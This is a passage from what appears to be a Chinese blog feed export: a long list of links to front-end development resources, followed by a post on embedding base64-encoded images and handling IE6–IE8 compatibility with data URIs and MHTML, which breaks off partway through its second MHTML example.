web前端性能优化进阶路前端技术：网站性能优化之CSS无图片技术 http://my.eoe.cn/tuwandou/archive/4544.html浏览器的加载与页面性能优化 http://www.baiduux.com/blog/2011/02/15/browser-loading页面加载中的图片性能优化 http://www.w3ctech.com/p/1503Hey——前端性能 Hey——前端性能html优化 html优化99css——性能 99css——性能Yslow——性能优化 http://www.yslow.net/category.php?cid=20YSLOW中文介绍 http://www.cnblogs.com/yslow转一篇Yahoo关于网站性能优化的文章，兼谈本站要做的优化 http://www.360ito.com/article/40.htmlYahoo!团队实践分享：网站性能 http://www.360doc.com/content/10/0928/09/2588264_56971287.shtml网站性能优化指南：什么使我们的网站变慢？ http://blog.jiasule.com/i/153网站性能优化实践，减少加载时间，提高用户体验 http://www.powereasy.net/helpyou/knowledge/ecommerce/9593.html浅谈网站性能优化 前端篇 http://www.umtry.com/archives/747.html前端重构实践之如何对网站性能优化？ http://www.adinnet.cn/blog/designview/2012-7-12/678.html前端性能优化：使用媒体查询加载指定大小的背景图片 http://www.gbin1.com/technology/javascript/20130708-front-end-performance-optimization-9网站性能系列博文 http://www.mykuer.com/post/factors-that-affect-the-speed-of-web-site-open.html加载，不只是少一点点 http://tgideas.qq.com/webplat/info/news_version3/804/808/811/m579/201109/41355.shtml前端性能的测试与优化 http://mzhou.me/article/95310分享网页加载速度优化的一些技巧？ http://www.gbin1.com/technology/html/20130217-tips-for-speed-up-page-loading页面加载中的图片性能优化 http://www.f2es.com/images-bytes-optweb前端优化(基于Yslow http://www.tcreator.info/webSchool/website/Front-end-Opt-Yslow.html网站性能优化工具大全 https://www.qianduan.net/website-performance-optimization-tool.html【高性能前端1】高性能HTML http://www.alloyteam.com/2012/10/high-performance-html【高性能前端2】高性能CSS http://www.alloyteam.com/2012/10/high-performance-css由12306谈谈网站前端性能和后端性能优化 http://coolshell.cn/articles/6470.htmlAlloyTeam——前端优化 AlloyTeam——前端优化毫秒必争，前端网页性能最佳实践 http://www.cnblogs.com/developersupport/p/3248695.html网站性能工具Yslow的使用方法 http://blog.sina.com.cn/s/blog_6e9d2e0701017kvu.html前端工程与性能优化（上）：静态资源版本更新与缓存 http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part1前端工程与性能优化（下）：静态资源管理与模板框架 http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part2HTTPS连接的前几毫秒发生了什么 http://blog.jobbole.com/48369Yslow http://uicss.cn/yslow/#more-12319Essential Web Performance Metrics — A Primer, Part 1 http://blog.smartbear.com/web-performance/essential-web-performance-metrics-a-primer-part-1Essential Web Performance Metrics — Part 2 http://blog.smartbear.com/performance/essential-web-performance-metrics-part-2YUISlide,针对移动设备的动画性能优化 http://jayli.github.io/blog/data/2011/12/23/yuislide.htmlImproving Site Performance http://joelglovier.com/improving-site-performance让网站提速的最佳前端实践 http://segmentfault.com/a/1190000000367899Why Website Speed is Important http://sixrevisions.com/web-development/why-website-speed-is-importantNeed for Speed – How to Improve your Website Performance https://www.devbridge.com/articles/need-for-speed-how-to-improve-your-website-performance阿里无线前端性能优化指南 (Pt.1 加载期优化 https://github.com/amfe/article/issues/1优化工具JavaScript 性能分析新工具 OneProfile http://www.html-js.com/article/3083JavaScript 堆内存分析新工具 OneHeap http://www.html-js.com/article/3091在线工具google在线工具 https://developers.google.com/speed/pagespeed/insights阿里测 http://www.alibench.com阿里-免费测试服务 http://itest.aliyun.com阿里-F2etest多浏览器兼容性测试解决方案 https://github.com/alibaba/f2etestjs性能测试 http://jsperf.com前端架构技术架构 http://www.zhihu.com/topic/19612641前端架构 http://saito.im/note/The-Architecture-of-F2E如何成为前端架构师 http://www.zhihu.com/question/24092572关于前端架构-张克军 http://hikejun.com/sharing/2010webrebuild/?file=fe-infrastructure.html百度腾讯offer比较（腾讯游戏VS百度基础架构） http://www.zhihu.com/question/25583350推荐作品winter代码片段需要翻墙 https://gist.github.com/wintercnfgm http://www.fgm.cc/learn岑安作品集 https://github.com/hongru/hongru.github.com当耐特demo集合 http://kmdjs.github.io米空格 js作品 http://www.laoshu133.com/LabmyFocus http://koen301.github.ioSeaJS组件库 http://panxuepeng.github.io/seajslib颜海镜作品 http://yanhaijing.com/myProject脚儿网作品 http://jo2.org/category/myworksjavascript个人作品 http://www.cnitblog.com/yemoo/category/3107.html妙味的雷东升游戏作品 http://bbs.miaov.com/forum.php?mod=viewthread&amp;tid=7790javascript作品集 http://bbs.csdn.net/topics/380227212云五笔，灰度产生生成工具 https://github.com/TooBug/works项目主页 http://koen301.github.io个性的作品主页 http://zaole.net播放器 http://static.tingall.com/v2/playerucren js demos 集 http://ucren.com/blog/demos智能社 http://www.zhinengshe.com/works_list.html实例陈列架 http://demos.shizuwu.cnzoye demo http://zoye.sinaapp.com/demo王员外 http://lab.yuanwai.wang平凡 http://pingfan1990.sinaapp.comjyg 游戏案例 http://www.lovewebgames.com很多jquery插件 http://www.helloweba.com/list.html不羁虫 - soJs 作品系列 http://www.bujichong.com/sojs/api/index.htmlfrozenui http://frozenui.github.io/case.html黑白棋 http://js-game.github.io/othellofromone http://yansm.github.io/fromone/index.htmlpazguille http://pazguille.meHtml5 VideoPlayer https://github.com/zmmbreeze/DeadSimpleVideoPlayerProton 烟花 http://a-jie.github.io/Proton/#example简历模板不错的个人简历 http://learnshare.github.io/about/index.html简历 http://hcy2367.github.io/resume张伦 http://ncuey.sinaapp.com/CrispElite/简历 https://github.com/hacke2/ResumeSample翁天信 http://blog.dandyweng.com/2013/07/how-my-website-was-created动画方式的简历 http://www.webhek.com/misc/interactive-resume组件丰富简历 http://www.linqing07.com/resume.html简历池 http://www.mojianli.com/resume/viewhaorooms博客 http://www.haorooms.com/aboutJustin Young http://cv.youngdze.com面试题那几个月在找工作（百度，网易游戏） http://www.nowcoder.com/discuss/31962014最新面试题 http://www.html-js.com/article/1743阿里前端面试题 http://www.w3cfuns.com/thread-5598563-2-1.html2016校招内推 – 阿里巴巴前端 – 三面面试经历 http://www.cnblogs.com/imwtr/p/4685546.html腾讯面试题 http://www.w3cfuns.com/article-5599657-1-1.html年后跳槽那点事：乐视+金山+360面试之行 http://www.cnblogs.com/lvdabao/p/3660707.html阿里前端面试题上线 http://fatesinger.com/2722.html拉勾网js面试题 http://www.cnblogs.com/52cik/p/js-question-lg.html前端面试 http://www.cnblogs.com/allenxing/p/3724382.htmlWeb开发笔试面试题 大全 http://mianshiti.diandian.com前端开发面试题 http://segmentfault.com/a/11900000004654312014最新前端面试题 https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions百度面试 https://github.com/fex-team/interview-questions面试题 http://www.w3cfuns.com/forum.php?mod=forumdisplay&amp;fid=51&amp;filter=typeid&amp;typeid=177前端工作面试问题 https://github.com/darcyclarke/Front-end-Developer-Interview-Questions/tree/master/Chinese前端开发面试题 http://segmentfault.com/a/11900000004654315个经典的前端面试问题 5个经典的前端面试问题最全前端面试问题及答案总结 http://segmentfault.com/a/1190000002562454如何面试一名前端开发工程师？ http://www.html-js.com/article/Large-search-front-team-column%202961史上最全 前端开发面试问题及答案整理 https://github.com/hawx1993/Front-end-Interview-questions前端实习生面试总结 http://www.cnblogs.com/xiaoruo/p/4665163.html史上最全 前端开发面试问题及答案整理 https://github.com/hawx1993/Front-end-Interview-questionsBAT及各大互联网公司2014前端笔试面试题：JavaScript篇 http://blog.jobbole.com/78738前端开发面试题大收集 https://github.com/paddingme/Front-end-Web-Development-Interview-Question收集的前端面试题和答案 https://github.com/qiu-deqing/FE-interview如何面试前端工程师 http://www.zhihu.com/question/19568008前端开发面试题 https://github.com/markyun/My-blog/blob/master/Front-end-Developer-Questions/Questions-and-Answers/README.md牛客网-笔试面经 http://www.nowcoder.com/discuss?type=2iconfont中文字体 http://www.zhihu.com/question/21253343淘宝字库 http://iconfont.cn字体 http://mux.alimama.com/fonts制作教程 http://iconfont.cn/help/platform.htmlzhangxinxu-icommon http://www.zhangxinxu.com/wordpress/?s=icomoonicommon https://icomoon.io/app用字体在网页中画ICON图标(推荐教程 http://imooc.com/learn/243字体压缩工具 http://font-spider.orgFiddlerFiddler调式使用知多少(一深入研究 http://www.cnblogs.com/tugenhua0707/p/4623317.html微信fiddle http://www.cnblogs.com/strick/p/4570006.html微信fiddle http://gaoboy.com/article/26.htmlChromeGoogle Chrome 官方 https://developer.chrome.com/devtoolsChrome - 基础 http://www.cnblogs.com/constantince/p/4565261.htmlChrome - 进阶 http://www.cnblogs.com/constantince/p/4579121.htmlChrome - 性能 http://www.cnblogs.com/constantince/p/4585983.htmlChrome - 性能进阶 http://www.cnblogs.com/constantince/p/4607497.htmlChrome - 移动 http://www.cnblogs.com/constantince/p/4624241.htmlChrome - 使用技巧 http://www.cnblogs.com/liyunhua/p/4544738.htmlChrome - Console控制台不完全指南 http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.htmlChrome - Workspace使浏览器变成IDE http://c7sky.com/chrome-devtools-workspace.htmlnetwork面板 http://www.html-js.com/article/Nothing-blind%202975chrome开发工具快捷键 http://anti-code.com/devtools-cheatsheetchrome调试工具常用功能整理 http://www.html-js.com/article/2327Chrome 开发工具 Workspace 使用 http://www.iinterest.net/2014/05/09/chrome-dev-tool-workspaceChrome神器Vimium快捷键学习记录 http://www.cppblog.com/deercoder/archive/2011/10/22/158886.htmlsass调试-w3cplus http://www.w3cplus.com/sassguide/debug.html如何更专业的使用Chrome开发者工具-w3cplus http://www.w3cplus.com/tools/how-to-use-chrome-devtools-like-a-pro.htmlchrome调试canvas http://sentsin.com/web/253.htmlchrome profiles1 https://developer.chrome.com/devtools/indexchrome profiles2 http://h5dev.uc.cn/article-25-1.htmlchrome profiles3 http://www.oschina.net/translate/performance-optimisation-with-timeline-profileschrome移动版调试 https://developer.chrome.com/devtools/docs/mobile-emulationchrome调试 http://ued.taobao.org/blog/2012/06/debug-with-chrome-dev-toolchrome的调试 http://www.cnblogs.com/QLeelulu/archive/2011/08/28/2156402.htmlchrome console 命令详解 https://developer.chrome.com/devtools/docs/commandline-api查看事件绑定1 http://www.cnblogs.com/leonkao/p/3809655.html查看事件绑定2 http://www.cnblogs.com/xiaoyao2011/p/3447421.html神器——Chrome开发者工具(一 http://segmentfault.com/a/1190000000683599奇趣百科性能优化(Chrome DevTools 中的 Timeline Profils 等工具使用介绍 https://xinranliu.me/2015-05-22-qiqu-performancechrome 开发者工具的 15 个小技巧 http://frontenddev.org/link/15-tips-of-chrome-developer-tools.htmlChrome开发者工具不完全指南 http://1ke.co/course/361Chrome 开发者工具使用技巧 http://segmentfault.com/a/1190000003882567Firebugfirebug视频教程 http://www.imooc.com/learn/137firefox 模拟器 https://developer.mozilla.org/zh-CN/docs/Tools/WebIDEconsole.log 命令详解 http://www.cnblogs.com/ctriphire/p/4116207.htmlFirebug入门指南 http://www.ruanyifeng.com/blog/2008/06/firebug_tutorial.htmlFirebug控制台详解 http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html移动,微信调试浏览器端调试安卓 https://openstf.github.io移动端前端开发调试 http://yujiangshui.com/multidevice-frontend-debug使用 Chrome 远程调试 Android 设备 https://github.com/yujiangshui/CN-Chrome-DevTools/blob/remote-debugging/md/Use-Tools/remote-debugging.mdmac移动端调试 http://plus.uc.cn/document/webapp/doc5.htmlmac移动端调试 http://www.mihtool.com无线调试攻略 http://thx.github.io/mobile/debugging-in-mobile无线调试攻略 http://yanhaijing.com/mobile/2014/12/17/web-debug-for-mobile屌爆了,完美调试 微信webview(x5 http://www.jianshu.com/p/ccf124f1f74b微信调试的那些事 微信调试的那些事远程console http://jsconsole.com微信调试工具 http://blog.qqbrowser.cc各种真机远程调试方法汇总 https://github.com/jieyou/remote_inspect_web_on_real_deviceiOS SimulatorSimulator iOS_Simulator_Guide-IntroductioniOS Simulator的介绍和使用心得 http://www.crifan.com/intro_ios_simulator_in_xcode_and_usage_summaryimgloading img http://preloaders.net/en/circular智图-图片优化平台 http://zhitu.isux.us在线png优化 https://tinypng.com生成二维码生成二维码 http://cli.im浏览器同步puer https://github.com/leeluolee/puerliveReload http://livereload.comf5 http://getf5.comFile Watchers http://geek100.com/2608在线PPT制作nodePPT nodePPTCleaver快速制作网页PP http://www.jeffjade.com/2015/10/15/2015-10-16-cleaver-make-ppt/impress.js http://www.cnblogs.com/Darren_code/archive/2013/01/04/impressjs.htmlPPT https://github.com/ksky521/nodePPTreveal https://github.com/hakimel/reveal.jsslippy https://github.com/Seldaek/slippy## *前端导航网站界面清爽的前端导航 http://uxbees.com/index.html前端导航 http://whycss.com前端网址导航 http://www.daqianduan.com/nav前端名录 http://sentsin.com/daohang前端导航 http://123.jser.us前端开发资源 http://www.css88.com/nav网址导航 http://www.haourl.cn前端开发仓库 - 众多效果的收集地 http://code.ciaoca.com前端资源导航 https://github.com/jnoodle/f2e-collectF2E 前端导航 http://f2e.im/static/pages/nav/index.html常用CDN新浪CDN http://lib.sinaapp.com百度静态资源公共库 http://cdn.code.baidu.com360网站卫士常用前端公共库CDN服务 http://libs.useso.comBootstrap中文网开源项目免费 CDN 服务 http://www.bootcdn.cn开放静态文件 CDN - 七牛 http://staticfile.orgCDN加速 - jq22 http://www.jq22.com/cdnjQuery CDN http://code.jquery.comGoogle jQuery CDN http://www.google-jquery-cdn.com微软CDN http://www.asp.net/ajax/cdnGitgit-scm http://git-scm.com廖雪峰-Git教程 廖雪峰-Git教程git-for-windows https://git-for-windows.github.ioGitHub 添加 SSH keys http://daemon369.github.io/git/2015/03/10/add-ssh-keys-for-githubgogithub http://www.worldhello.net/gotgithub/index.htmlgit常规命令练习 http://pcottle.github.io/learnGitBranchinggit的资料整理 https://github.com/xirong/my-git我所记录的git命令（非常实用） http://www.cnblogs.com/fanfan259/p/4810517.html企业开发git工作流模式探索部分休整 https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.mdGitHub 漫游指南 https://github.com/phodal/github-roamGitHub秘籍 https://github.com/tiimgreen/github-cheat-sheet/blob/master/README.zh-cn.md使用git和github进行协同开发流程 http://livoras.com/post/28动画方式练习git http://onlywei.github.io/explain-git-with-d3各种日期日历经典my97 http://www.my97.net/dp/demo/index.htm强大的独立日期选择器 http://www.cnblogs.com/gbin1/archive/2012/04/16/2452105.htmlfullcalendar http://fullcalendar.iofullcalendar日历控件知识点集合 http://blog.csdn.net/francislaw/article/details/7740630中文api http://blog.sina.com.cn/s/blog_9475b1c101012c5f.html农历日历 https://github.com/zzyss86/LunarCalendar超酷的仿百度带节日日历老黄历控件 http://www.sucaisj.com/jiaoben/date/201509/16856.html日期格式化 http://momentjs.com大牛日历控件 https://github.com/Johnqing/QPAYCalendar我群某管理作品 https://github.com/Iamlars/dateMarkerinput按位替换-官网 http://digitalbush.com/projects/masked-input-plugininput按位替换-github https://github.com/digitalBush/jquery.maskedinput/tree/1.2.2bootstrap-daterangepicker https://github.com/dangrossman/bootstrap-daterangepicker国外30个插件集合 http://www.vandelaydesign.com/30-best-free-jquery-pluginsJavaScript datepicker http://dbushell.com/2012/10/09/pikaday-javascript-datepickerDatepair.js http://jonthornton.github.io/Datepair.js一个风格多样的日历 https://github.com/glad/glDatePicker弹出层式的全日历 http://amsul.ca/pickadate.js/datejquery双日历 http://www.daterangepicker.com大气实用jQuery手机移动端日历日期选择插件 http://www.frankdemo.cn/index.php?c=content&amp;a=show&amp;id=115jQuery Mobile 移动开发中的日期插件Mobiscroll https://mobiscroll.comDate libraryDatejs https://github.com/datejs/Datejssugarjs http://sugarjs.com/api/Date其它Mock.js 是一款模拟数据生成器 http://mockjs.com特色的HTML框架可以创建精美的iOS应用 http://framework7.taobao.org淘宝SUI http://m.sui.taobao.orgavalonjs http://avalonjs.github.ioAvalon新一代UI库： OniUI http://ued.qunar.com/oniui/index.htmlavalon.oniui-基于avalon的组件库 https://github.com/RubyLouvre/avalon.oniui效果类弹出层 http://www.imooc.com/learn/58焦点图轮播特效 http://www.imooc.com/learn/18HTML5 有哪些让你惊艳的 demo？ http://www.zhihu.com/question/24398907弹出层artDialog 最新版 https://github.com/aui/artDialogartDialog 文档 http://aui.github.io/artDialog/doc/index.htmlgoogle code 下载地址 https://code.google.com/p/artdialog/downloads/list贤心弹出层 http://layer.layui.com响应式用户交互组件库 https://github.com/bh-lay/UIsweetalert-有css3动画弹出层 http://t4t5.github.io/sweetalert优秀JavaScript项目Angular和Webpack种子文件 https://github.com/AngularClass/angular2-webpack-starterFis3面向前端的工程构建系统 https://github.com/fex-team/fis3Fis3 DEMO https://github.com/fex-team/fis3-demo前端JQuery系列:源码剖析 https://github.com/JsAaron/jQueryavalon框架 https://github.com/RubyLouvre/avalonMicrosoft ChakraCore 微软的Chakra引擎 https://github.com/Microsoft/ChakraCoreQuintus HTML游戏引擎 https://github.com/cykod/Quintus一个用node.js搭建的有趣博客 https://github.com/STRML/strml.netWeb前端助手–FeHelper（Chrome扩展） https://github.com/zxlie/FeHelper百度前端技术学院 https://github.com/baidu-ife/ifeCheerio（node.js中的jQuery） https://github.com/cheeriojs/cheerionodejs的一个聊天软件 类似微信 https://github.com/BryanYang/freechat使用html5和node.js构建的网易云音乐 https://github.com/stkevintan/Cubebabel ES6转换为ES5 https://github.com/babel/babel一个JS富文本编辑器 https://github.com/fex-team/ueditor一个JS脑图可视化工具 https://github.com/fex-team/kityminder-core一个JS写的Flappy Bird Game https://github.com/ellisonleao/clumsy-bird一个JS写的GBA模拟器 https://github.com/taisel/IodineGBASegmentFault写的Markdown解析器 https://github.com/SegmentFault/HyperDown.js基于node.js的Ghost博客 https://github.com/TryGhost/Ghost学习react的demos https://github.com/ruanyf/react-demos]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>前端开发资源汇集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Base64(二进制)图片编码解析及在各种浏览器的兼容性处理]]></title>
    <url>%2F2016%2F08%2F15%2Fbase64%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9B%BE%E7%89%87%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%9C%A8%E5%90%84%E7%A7%8D%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E5%A4%84%2F</url>
    <content type="text"><![CDATA[IE浏览器目前最高的版本是v11，而微软放弃了IE，转向新的浏览器开发，并取名为Edge。base64图片在IE9及以后的图片均能显示没有问题，而Firefox, Chrome, Safari等非IE浏览器都能正常显示，所以显得IE浏览器比较low。那么兼容性究竟应该怎么来处理呢？分三种情况。（1）IE9+、Firefox、Chrome、Safari等浏览器base64图片在HTML里的标准写法是：12&lt;img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/ha6aYeDr18DWornKrlX+/sP/9k=" /&gt;&lt;div style="width:100px; height:100px; background-image:url('data:image/jpeg;base64, /9j/4AAQSkZJRgABAQEASABIAAD/ha6aYeDr18DWornKrlX+/sP/9k=')"&gt;&lt;/div&gt;javascript给img元素的src属性赋值或是给其他元素的backgroundImage属性赋值都可以正确的显示图片。其格式为 data:{mimeType};base64,{code}{mimeType}，是指图片的格式类型，一般来说，JPG文件填写image/jpeg， GIF文件填写image/gif， PNG文件填写 image/png。{code}&gt;是指图片二进制转换成base64的字符串。（2）IE6、IE7浏览器低版本的IE浏览器不支持img的src属性用data:image/jpeg这样写，但是我们可以使用mhtml调用附件资源的形式来处理图片。格式如下：1234567891011121314151617&lt;!--Content-Type: multipart/related; boundary="imagedata"--imagedataContent-Type: image/jpegContent-Location: showimgContent-Transfer-Encoding: base64/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAYEBAQFBAYFBQYJBgUGCQsIBgYICwwKCgsKCgwQDAwMDAwMEAwODxAPDgwTExQUExMcGxsbHCAgICAgICAgICD/2wBDAQcHBw0MDRgQEBgaFREVGiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICD/wAARCAAQABADAREAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAABAUGB//EACQQAAEFAAIBAwUAAAAAAAAAAAQBAgMFBgcSEwARIRQjJDFR/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/ANfutxoRtBYDOvKqmAZeCZypjKqjD5pzC68YxiOkgNHa3s4hzU92I1ET5X0EfRck7y75LzFbZFiz4u6KtoKgyn/CU+SkayRxM33rF30vnicyJkZDPKnzIixr0cAnMh+lAN1uTk4/sdfn9e8ezSwqZCWKOrBRhGxuWMQhiTRTV3lROyoqK3snt7p6Bfjr3YablLjaKXjq1yFBkILEWKUppU0KQzV3hha6aYeDr18DWornKrlX+/sP/9k=--imagedataContent-Type: image/jpegContent-Location: img2Content-Transfer-Encoding: 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--&gt;（3）IE8浏览器ie8浏览器分两种情况。一种是在XP下ie6升级到ie8，另一种是Win7自带的ie8。两者的区别是XP下的ie8不支持javascript直接将backgroundImage赋值为base64值。但是Win7下是可以的。如何兼容在代码上我们使用UserAgent里的Trident和Windows NT版本来确认ie8在何种情况使用：A.当NT版本是NT 5.x并且Trident没现出现的时候，判定为xp下的ie6和ie7，执行第2种情况；B.当NT版本是NT 5.x并且Trident 4.0的时候，判定为xp下的ie8，执行第2种情况；C.当NT版本是NT 6.x时，为win7、win8、win10系统，执行第1种情况；D.都不是时，就是非IE流览器，执行第1种情况123456789101112131415161718&lt;!--Content-Type: multipart/related; boundary="imagedata"--imagedataContent-Type: image/jpegContent-Location: showimgContent-Transfer-Encoding: base64/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAYEBAQFBAYFBQYJBgUGCQsIBgYICwwKCgsKCgwQDAwMDAwMEAwODxAPDgwTExQUExMcGxsbHCAgICAgICAgICD/2wBDAQcHBw0MDRgQEBgaFREVGiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICD/wAARCAAQABADAREAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAABAUGB//EACQQAAEFAAIBAwUAAAAAAAAAAAQBAgMFBgcSEwARIRQjJDFR/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/ANfutxoRtBYDOvKqmAZeCZypjKqjD5pzC68YxiOkgNHa3s4hzU92I1ET5X0EfRck7y75LzFbZFiz4u6KtoKgyn/CU+SkayRxM33rF30vnicyJkZDPKnzIixr0cAnMh+lAN1uTk4/sdfn9e8ezSwqZCWKOrBRhGxuWMQhiTRTV3lROyoqK3snt7p6Bfjr3YablLjaKXjq1yFBkILEWKUppU0KQzV3hha6aYeDr18DWornKrlX+/sP/9k=--imagedataContent-Type: image/jpegContent-Location: img2Content-Transfer-Encoding: 